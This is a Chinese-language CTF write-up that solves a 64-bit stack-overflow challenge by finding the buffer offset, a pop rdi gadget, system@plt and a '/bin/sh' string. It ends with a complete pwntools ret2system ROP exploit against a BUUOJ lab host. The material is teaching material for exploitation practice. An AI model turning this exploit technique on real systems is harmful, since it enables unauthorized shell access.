# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744723755250-4700a8a5-f183-4977-b28a-73e587828687.png)

# 做法

开虚拟机checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744723778191-3aa7f7a0-10f8-4c85-b775-9ae63fd06f64.png)

64位，没开栈保护

扔进IDA（64位），找到main，F5反编译

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744723824962-55829459-1575-40d5-ba27-461c78daec4b.png)

调用了vulnerable_function函数，其他没啥，点进去看看

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744723904139-4e6e5e09-f4ff-4fe2-925c-58088773f5ef.png)

还是没啥，点进缓冲区buf看看

完整代码如下，buf对应第9行buf

```
-0000000000000080 ; D/A/*   : change type (data/ascii/array)
-0000000000000080 ; N       : rename
-0000000000000080 ; U       : undefine
-0000000000000080 ; Use data definition commands to create local variables and function arguments.
-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
-0000000000000080 ;
-0000000000000080
-0000000000000080 buf             db ?
-000000000000007F                 db ? ; undefined
-000000000000007E                 db ? ; undefined
-000000000000007D                 db ? ; undefined
-000000000000007C                 db ? ; undefined
-000000000000007B                 db ? ; undefined
-000000000000007A                 db ? ; undefined
-0000000000000079                 db ? ; undefined
-0000000000000078                 db ? ; undefined
-0000000000000077                 db ? ; undefined
-0000000000000076                 db ? ; undefined
-0000000000000075                 db ? ; undefined
-0000000000000074                 db ? ; undefined
-0000000000000073                 db ? ; undefined
-0000000000000072                 db ? ; undefined
-0000000000000071                 db ? ; undefined
-0000000000000070                 db ? ; undefined
-000000000000006F                 db ? ; undefined
-000000000000006E                 db ? ; undefined
-000000000000006D                 db ? ; undefined
-000000000000006C                 db ? ; undefined
-000000000000006B                 db ? ; undefined
-000000000000006A                 db ? ; undefined
-0000000000000069                 db ? ; undefined
-0000000000000068                 db ? ; undefined
-0000000000000067                 db ? ; undefined
-0000000000000066                 db ? ; undefined
-0000000000000065                 db ? ; undefined
-0000000000000064                 db ? ; undefined
-0000000000000063                 db ? ; undefined
-0000000000000062                 db ? ; undefined
-0000000000000061                 db ? ; undefined
-0000000000000060                 db ? ; undefined
-000000000000005F                 db ? ; undefined
-000000000000005E                 db ? ; undefined
-000000000000005D                 db ? ; undefined
-000000000000005C                 db ? ; undefined
-000000000000005B                 db ? ; undefined
-000000000000005A                 db ? ; undefined
-0000000000000059                 db ? ; undefined
-0000000000000058                 db ? ; undefined
-0000000000000057                 db ? ; undefined
-0000000000000056                 db ? ; undefined
-0000000000000055                 db ? ; undefined
-0000000000000054                 db ? ; undefined
-0000000000000053                 db ? ; undefined
-0000000000000052                 db ? ; undefined
-0000000000000051                 db ? ; undefined
-0000000000000050                 db ? ; undefined
-000000000000004F                 db ? ; undefined
-000000000000004E                 db ? ; undefined
-000000000000004D                 db ? ; undefined
-000000000000004C                 db ? ; undefined
-000000000000004B                 db ? ; undefined
-000000000000004A                 db ? ; undefined
-0000000000000049                 db ? ; undefined
-0000000000000048                 db ? ; undefined
-0000000000000047                 db ? ; undefined
-0000000000000046                 db ? ; undefined
-0000000000000045                 db ? ; undefined
-0000000000000044                 db ? ; undefined
-0000000000000043                 db ? ; undefined
-0000000000000042                 db ? ; undefined
-0000000000000041                 db ? ; undefined
-0000000000000040                 db ? ; undefined
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038                 db ? ; undefined
-0000000000000037                 db ? ; undefined
-0000000000000036                 db ? ; undefined
-0000000000000035                 db ? ; undefined
-0000000000000034                 db ? ; undefined
-0000000000000033                 db ? ; undefined
-0000000000000032                 db ? ; undefined
-0000000000000031                 db ? ; undefined
-0000000000000030                 db ? ; undefined
-000000000000002F                 db ? ; undefined
-000000000000002E                 db ? ; undefined
-000000000000002D                 db ? ; undefined
-000000000000002C                 db ? ; undefined
-000000000000002B                 db ? ; undefined
-000000000000002A                 db ? ; undefined
-0000000000000029                 db ? ; undefined
-0000000000000028                 db ? ; undefined
-0000000000000027                 db ? ; undefined
-0000000000000026                 db ? ; undefined
-0000000000000025                 db ? ; undefined
-0000000000000024                 db ? ; undefined
-0000000000000023                 db ? ; undefined
-0000000000000022                 db ? ; undefined
-0000000000000021                 db ? ; undefined
-0000000000000020                 db ? ; undefined
-000000000000001F                 db ? ; undefined
-000000000000001E                 db ? ; undefined
-000000000000001D                 db ? ; undefined
-000000000000001C                 db ? ; undefined
-000000000000001B                 db ? ; undefined
-000000000000001A                 db ? ; undefined
-0000000000000019                 db ? ; undefined
-0000000000000018                 db ? ; undefined
-0000000000000017                 db ? ; undefined
-0000000000000016                 db ? ; undefined
-0000000000000015                 db ? ; undefined
-0000000000000014                 db ? ; undefined
-0000000000000013                 db ? ; undefined
-0000000000000012                 db ? ; undefined
-0000000000000011                 db ? ; undefined
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008                 db ? ; undefined
-0000000000000007                 db ? ; undefined
-0000000000000006                 db ? ; undefined
-0000000000000005                 db ? ; undefined
-0000000000000004                 db ? ; undefined
-0000000000000003                 db ? ; undefined
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

栈溢出吗？先数一下吧，offset=8* 16+8=136

然后按Shift+F12找后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744724205437-db7d1e28-3226-4d37-a021-d1b7dc5f7a81.png)

找到一个system，一个/bin/sh，但是点进去没啥东西的

但是，有/bin/sh，然后我们再看到左边函数窗口有plt地址的system，我们瞬间想到可以用ROP来解这道题（不懂的看下面的《补充》）

然后因为这个文件是64位的，我们还需用ROPgadget来查询该文件的pop rdi地址

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744724665887-83c0f5f1-0bf8-4c40-b944-1a2327008e27.png)

```
ROPgadget --binary 文件  --only "pop|ret" | grep "rdi"（|后面的是筛选，不要|及后面的内容会弹出很多地址）
```

我们就开始编写exp

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744724851121-4703d111-a908-40ea-8520-9dde1d7aa4ce.png)

代码如下

```
# 导入所需模块
from pwn import *

#与靶机连接
r = remote("node5.buuoj.cn",29666)

#构建payload
payload = b'a' * 136 + p64(0x4006b3) + p64(0x600A90) + p64(0x4004C0)

#发送payload
r.sendline(payload)

#与靶机进行交互
r.interactive()           
```

常规，得出flag

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744724929076-7771efcc-d6ca-4882-a2f3-2b89ae047526.png)

# 补充

## （1）

32位的ROP是system函数在前，bin/sh函数在后，两函数中填入一个将来的返回地址，一般直接填0

## （2）

64位的ROP是bin/sh函数在前，system函数在后，两函数之前需要加上该文件的pop rdi地址

（用ROPgadget实现）

# 更新

于2025.4.15